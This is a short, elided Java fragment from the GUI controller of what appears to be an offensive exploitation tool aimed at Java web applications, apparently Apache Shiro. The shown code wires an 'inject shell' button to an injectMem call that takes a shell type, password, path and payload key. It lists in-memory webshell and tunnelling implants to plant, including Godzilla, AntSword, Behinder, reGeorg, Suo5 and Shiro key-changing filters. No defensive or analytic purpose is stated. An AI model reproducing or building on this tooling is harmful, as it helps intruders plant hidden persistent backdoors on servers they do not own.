...
public class MainController {
    ...
    @FXML
    public TextField payloadKeyText;
    ...
    void injectShellBtn(ActionEvent event) {
        ...
        String payloadskey = this.payloadKeyText.getText();
        if (AttackService.gadget != null ) {
            this.attackService.injectMem(memShellType, shellPass, shellPath,payloadskey);
        } else {
...
//        ObservableList<String> echoes = FXCollections.observableArrayList(new String[]{"AllEcho","TomcatEcho", "TomcatEcho2", "SpringEcho"});
        ...
        this.payloadKeyText.setText("user");
        final ObservableList<String> memShells = FXCollections.observableArrayList(new String[]{"哥斯拉[Filter]", "蚁剑[Filter]", "冰蝎[Filter]", "NeoreGeorg[Filter]", "reGeorg[Filter]", "哥斯拉[Servlet]", "蚁剑[Servlet]", "冰蝎[Servlet]", "NeoreGeorg[Servlet]", "reGeorg[Servlet]", "ChangeShiroKey[Filter]", "ChangeShiroKey[Filter2]", "BastionFilter", "BastionEncryFilter", "AddDllFilter","Suo5Filter","UpgradeMemshell"});
